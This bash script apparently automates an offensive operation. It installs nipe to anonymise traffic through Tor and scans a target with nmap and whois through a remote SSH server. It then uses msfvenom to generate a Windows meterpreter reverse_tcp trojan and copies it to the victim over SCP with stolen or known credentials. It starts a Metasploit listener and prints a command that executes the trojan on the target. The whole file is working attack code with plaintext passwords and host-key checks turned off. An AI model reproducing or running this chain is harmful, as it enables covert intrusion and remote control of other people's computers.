#!/bin/bash

#1.1 Install the needed applications
#1.2 If the application are already installed, don't install them again
echo -e "\e[31mFirst update the package list and then upgrades all installed packages to the latest versions\e[0m"

function system_update_upgrade
{
	echo -e "\e[31mUpdate package list...\e[0m"
	sudo apt update 
	echo -e "\e[31mUpgrading packages...\e[0m"
	sudo apt upgrade -y
}
system_update_upgrade

echo  -e "\e[31mLet's check if the needed application are installed and if not, will be installed\e[0m"
function check
{
	for app in nmap curl sshpass geoiplookup cpanm nipe;do
		APP_PATH=$(which $app 2>/dev/null)
		if [ "$app" == nmap ];then 
			if [ -z "$APP_PATH" ];then
				echo "Installing nmap..."
				sudo apt install nmap -y
			else
				echo -e "\e[32mnmap is installed\e[0m"
			fi
		fi
		
		if [ "$app" == curl ];then 
			if [ -z "$APP_PATH" ];then
				echo "Installing curl..."
                        	sudo apt install curl -y
                	else
                        	echo -e "\e[32mcurl is installed\e[0m"
                	fi
		fi
		
		if [ "$app" == sshpass ];then 
			if [ -z "$APP_PATH" ];then
				echo "Installing sshpass..."
                        	sudo apt install sshpass -y
                	else
                        	echo -e "\e[32msshpass is installed\e[0m"
                	fi
		fi
		
		if [ "$app" == geoiplookup ];then 
			if [ -z "$APP_PATH" ];then
				echo "Installing geoiplookup..."
                        	sudo apt install geoip-bin -y 
                	else
                        	echo -e "\e[32mgeoiplookup is installed\e[0m"
                	fi
		fi
		
		if [ "$app" == cpanm ];then 
                        if [ -z "$APP_PATH" ];then
			       echo "Installing cpanminus..." 
                               sudo apt install cpanminus -y
                        else
                                echo -e "\e[32mcpanm is installed\e[0m"
                        fi
                fi

		cd ~
		if [ "$app" == nipe ];then 
			if [ ! -d ~/nipe ];then
                        	git clone https://github.com/htrgouvea/nipe && cd nipe
				sleep 2
				cpanm --installdeps .
				sleep 2
				sudo perl nipe.pl install
			else
                        	echo -e "\e[32mnipe is installed\e[0m"
                	fi
		fi
							
	done
}
check
#1.3 Check if the network connection is anonymous; if not, alert the user and exit
function check_real_location
{	
	#Getting the public IP
	ip=$(curl -s ifconfig.co)
	#Getting only the country by using public IP
	location=$(geoiplookup $ip | awk -F':' '{print $2}' | awk '{print $2}' )
	echo -e "\e[31mYou are not anonymous: $location\e[0m"
	read -p "Do you want to be anonymos? -> y/n " answer
	if [ $answer == n ];then
		exit
	else
		:
	fi
}
check_real_location

#1.4 If the network connection is anonymous, display the spoofed country name.
function spoofed_country
{
	cd ~/nipe
	sudo perl nipe.pl start
	sleep 3
	check_status=$(sudo perl nipe.pl status | grep -i status | awk '{print $3}')
	if [ "$check_status" = "true" ];then
		ip=$(curl -s ifconfig.co)
		location=$(geoiplookup $ip | awk -F':' '{print $2}' | awk '{print $2}' )
		echo "You are now anonymous. Your spoofed country is: $location"
	else
		echo "You are not anonymous."
	fi
}
spoofed_country

function data_collecting
{
        echo $(date) - Scanning for open ports $ip_target >> LOGS
	echo $(date) - Getting more info with whois command about $ip_target >> LOGS
}

function reconnaissance 
{
	echo -e "\e[32mWhat is the IP of the remote server which will be used to scan the target?\e[0m"
	read remote_server

	echo -e "\e[32mWhat is the password for the remote server?\e[0m"
	read remote_server_pass
	
	echo -e "\e[32mWhich is user to the remote server?\e[0m"
	read user	
	#Here the user specifies the target ip address to scan via remote server, saved in variable ip_target
	echo -e "\e[32mWhat is the IP of the target?\e[0m"
	read ip_target
	
	#Display the remote server (country,IP and uptime)
	echo -e "\e[31mGetting information about the remote server: Public IP, Country, uptime. It can take a couple of minutes......\e[0m"
	
	remote_ip=$(sshpass -p "$remote_server_pass" ssh -o StrictHostKeyChecking=no $user@$remote_server "wget -qO- http://ifconfig.co")
	echo -e "\e[32mPublic IP: $remote_ip\e[0m"	
	
	country=$(geoiplookup $remote_ip | awk -F':' '{print $2}' | awk '{print $2}')
	echo -e "\e[32mCountry of the remote server: $country\e[0m"
	
	uptime=$(sshpass -p "$remote_server_pass" ssh -o StrictHostKeyChecking=no $user@$remote_server "uptime")
	echo -e "\e[32mUptime of the remote server: $uptime\e[0m"
	cd ~/nipe	
	#Get the remote server to check the whois of the given address
	echo -e "\e[31mRemote server is checking the target ip with whois command..it may takes sometime\e[0m"
	whois_check=$(sshpass -p "$remote_server_pass" ssh -o StrictHostKeyChecking=no $user@$remote_server "whois $ip_target") 
	echo $whois_check | tee -a whois_results
	
	#Get the remote server to scan for open ports on the given address
	echo -e "\e[31mChecking the open ports of your target\e[0m"
	data_collecting
	open_ports=$(sshpass -p "$remote_server_pass" ssh -o StrictHostKeyChecking=no $user@$remote_server "sudo nmap -T4 $ip_target")
	echo $open_ports | tee -a nmap_results

}
reconnaissance

function troyan_in_action
{	
	
	cd ~
	mkdir generated_troyan
	cd generated_troyan
	echo "Let's generate some troyan with reverse connection for Windows."
	read -p "How the troyan to be called? " name
	read -p "What is the ip of the remote server from which you will execute remote actions to the target? " remote_ip
	read -p "On which port you wanna listen the reverse connection? " port
	echo -e "\e[31mGenerating the troyan...\e[0m"
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=$remote_ip LPORT=$port -f exe -o $name.exe
	echo "The troyan.exe is in folder ~/generated_troyan"
	echo "If the target has port 22 open, you know the password for the user, and ip address, you can transfer it automatically."
	read -p "Do you want? y/n " answer
	if [ $answer == "n" ];then
		exit
	else
		:
	fi
	
	echo -e "\e[31mFollow the questions so the remote access be successful\e[0m"
	read -p "What is the name of the target user? " user
	read -p "What is the target IP? " target
	read -p "What is the password of the target user? " pass
	echo -e "\e[31mTransferring the file to the target user....\e[0m"
	sshpass -p "$pass" scp -o StrictHostKeyChecking=no $name.exe $user@$target:C:/Users/user/Desktop
	echo -e "\e[31mFile Transferred successfully...\e[0m"
        
	read -p "Which is the user for the remote server? " user_server
	read -p "What is the password for the remote server? " pass_server

	cd ~/generated_troyan	
	echo "use exploit/multi/handler
	set payload windows/meterpreter/reverse_tcp
	set lhost $remote_ip  
	set lport $port
	run" > script.rc
	
	echo "Transferring script.rc to the remote server, from where we will be listening..."	
	sshpass -p "$pass_server" scp -o StrictHostKeyChecking=no script.rc $user_server@$remote_ip:~/Desktop
	echo -e "\e[31mThe script is transferred.\e[0m"
	echo -e "\e[32mOpen another terminal, wait for the msfconsole to start and listen and copy and paste the sshpass command:\e[0m"
	echo -e "\e[31mThe command: \e[0m"
	echo  "sshpass -p \"$pass\" ssh -o StrictHostKeyChecking=no $user@$target \"cmd /c \\\"C:\\\\Users\\\\user\\\\Desktop\\\\$name.exe\\\"\""
	
	sshpass -p "$pass_server" ssh -o StrictHostKeyChecking=no $user_server@$remote_ip "cd Desktop; msfconsole -r script.rc"
}
troyan_in_action
